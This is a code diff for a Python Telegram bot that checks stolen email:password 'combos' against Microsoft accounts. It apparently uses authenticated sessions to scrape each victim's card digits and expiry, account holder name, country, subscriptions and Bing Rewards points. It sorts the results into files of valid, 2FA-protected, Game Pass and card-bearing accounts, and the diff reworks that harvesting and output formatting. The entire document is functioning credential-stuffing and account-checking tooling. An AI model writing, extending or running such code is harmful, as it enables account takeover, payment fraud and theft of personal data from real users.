@@ -8,7 +8,6 @@ import time
 import zipfile
 import shutil
 import uuid
-import datetime
 from urllib.parse import urlparse, parse_qs, quote
 from aiohttp import web
 from aiogram import Bot, Dispatcher, types, F
@@ -92,7 +91,7 @@ async def get_pifd_atk(session):
 
 async def get_payment_data(session, atk):
     headers = {"User-Agent": UA_EDGE, "Authorization": f'MSADELEGATE1.0="{atk}"', "Accept": "application/json"}
-    result = {"country": "Unknown", "holder": "N/A", "cards": [], "subs": [], "balance": ""}
+    result = {"country": "Unknown", "holder": "N/A", "cards": [], "subs": [], "balance": "", "points": "0"}
 
     # 1. Payment Instruments (Holder & Country)
     try:
@@ -100,17 +99,21 @@ async def get_payment_data(session, atk):
         async with session.get(url1, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
                 data = await r.json()
-                result["country"] = data.get("country", "Unknown").upper()
-                result["balance"] = str(data.get("balance", ""))
-                
-                for item in data.get("items", data.get("paymentInstruments", [])):
-                    holder = item.get("accountHolderName", "")
-                    if holder and result["holder"] == "N/A": 
-                        result["holder"] = holder
-                        
-                    last4 = item.get("lastFourDigits", "")
-                    if last4:
-                        result["cards"].append(f"{item.get('paymentMethodFamily', 'CC')} *{last4} ({item.get('expiryMonth', '')}/{item.get('expiryYear', '')})")
+                items = []
+                if isinstance(data, list):
+                    items = data
+                    for item in items:
+                        if 'country' in item: result['country'] = item['country'].upper()
+                        if 'accountHolderName' in item and result['holder'] == 'N/A': result['holder'] = item['accountHolderName']
+                        if 'lastFourDigits' in item:
+                            result["cards"].append(f"{item.get('paymentMethodFamily', 'CC')} *{item.get('lastFourDigits')}")
+                elif isinstance(data, dict):
+                    result['country'] = data.get('country', 'Unknown').upper()
+                    items = data.get('items', data.get('paymentInstruments', []))
+                    for item in items:
+                        if 'accountHolderName' in item and result['holder'] == 'N/A': result['holder'] = item['accountHolderName']
+                        if 'lastFourDigits' in item:
+                            result["cards"].append(f"{item.get('paymentMethodFamily', 'CC')} *{item.get('lastFourDigits')}")
     except: pass
 
     # 2. Subscriptions & Transactions
@@ -121,46 +124,30 @@ async def get_payment_data(session, atk):
                 data = await r.json()
                 for sub in data.get("subscriptions", []):
                     title = sub.get("title", "Unknown Sub")
-                    auto_renew = sub.get("autoRenew", False)
                     next_date = sub.get("nextRenewalDate", "")
-                    start_date = sub.get("startDate", "")
+                    next_date = next_date.split("T")[0] if next_date else "N/A"
                     
-                    # Calculate days left
-                    days_left = "Unknown"
-                    if next_date:
-                        try:
-                            dt = datetime.datetime.strptime(next_date.split("T")[0], "%Y-%m-%d")
-                            now = datetime.datetime.utcnow()
-                            days_left = (dt - now).days
-                        except: pass
-                        
-                    # Extract amount & currency
                     amt = sub.get("totalAmount", "")
                     curr = sub.get("currency", "")
-                    qty = sub.get("quantity", "1")
+                    price = f"{amt} {curr}" if amt and curr else ""
                     
-                    result["subs"].append({
-                        "title": title,
-                        "auto": "Yes" if auto_renew else "No",
-                        "next_date": next_date.split("T")[0] if next_date else "N/A",
-                        "start_date": start_date.split("T")[0] if start_date else "N/A",
-                        "days": days_left,
-                        "amount": amt,
-                        "currency": curr,
-                        "qty": qty
-                    })
+                    # Format: Title | Next Billing: Date | Price: Amount
+                    sub_str = f"{title}"
+                    if next_date != "N/A": sub_str += f" | Next Billing: {next_date}"
+                    if price: sub_str += f" | Price: {price}"
+                    
+                    result["subs"].append(sub_str)
     except: pass
 
     # 3. Rewards Points
-    points = "0"
     try:
         url3 = "https://rewards.bing.com/"
         async with session.get(url3, headers={"User-Agent": UA_EDGE}, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
-                m = re.search(r'"availablePoints":(\d+)', await r.text())
-                if m: points = m.group(1)
+                text = await r.text()
+                m = re.search(r'"availablePoints":(\d+)', text)
+                if m: result["points"] = m.group(1)
     except: pass
-    result["points"] = points
 
     return result
 
@@ -229,28 +216,10 @@ async def process_combos(combos, chat_id, status_msg, bot):
         if not r["data"]: continue
         d = r["data"]
         
-        # Build exact panel format
-        info1_list = []
-        info2_list = []
-        subs_list = []
+        card_str = ", ".join(d["cards"]) if d["cards"] else "None"
+        sub_str = ", ".join(d["subs"]) if d["subs"] else "None"
         
-        for sub in d["subs"]:
-            subs_list.append(sub["title"])
-            info1_list.append(f"Purchased Item: {sub['title']} | Auto Renew: {sub['auto']} | Next Billing: {sub['next_date']}")
-            info2_list.append(f"Product: {sub['title']} | Total Purchase: {sub['qty']} | Available Points: {d['points']} | Total Price: {sub['amount']} {sub['currency']}")
-        
-        # Main line
-        line = f"{r['email']}:{r['pw']} | Item: {', '.join(subs_list) if subs_list else 'N/A'}"
-        if d["subs"]:
-            first = d["subs"][0]
-            line += f" | Auto Renew: {first['auto']} | Next Billing: {first['next_date']} | Days Left: {first['days']}"
-        line += f" | Country: {d['country']} | Holder: {d['holder']} | Points: {d['points']}"
-        
-        if info1_list:
-            line += f" | Info 1: [ {info1_list[0]} ]"
-        if info2_list:
-            line += f" | Info 2: [ {info2_list[0]} ]"
-            
+        line = f"{r['email']}:{r['pw']} | Region: {d['country']} | Holder: {d['holder']} | Points: {d['points']} | Cards: [{card_str}] | Subs: [{sub_str}]"
         rich_valid.append(line)
 
     write_file("valid_rich.txt", rich_valid)
@@ -258,15 +227,13 @@ async def process_combos(combos, chat_id, status_msg, bot):
     write_file("invalid.txt", [f"{r['email']}:{r['pw']}" for r in bad])
     write_file("2fa.txt", [f"{r['email']}:{r['pw']}" for r in tfa])
     
-    # Subs & Cards
     gp = []
     cc = []
     for r in valid:
         if not r["data"]: continue
         d = r["data"]
-        for sub in d["subs"]:
-            if "pass" in sub["title"].lower() or "game" in sub["title"].lower():
-                gp.append(f"{r['email']}:{r['pw']} | {sub['title']} | Next Billing: {sub['next_date']}")
+        if any("pass" in s.lower() for s in d["subs"]):
+            gp.append(f"{r['email']}:{r['pw']} | {', '.join(d['subs'])}")
         if d["cards"]:
             cc.append(f"{r['email']}:{r['pw']} | {', '.join(d['cards'])}")
             
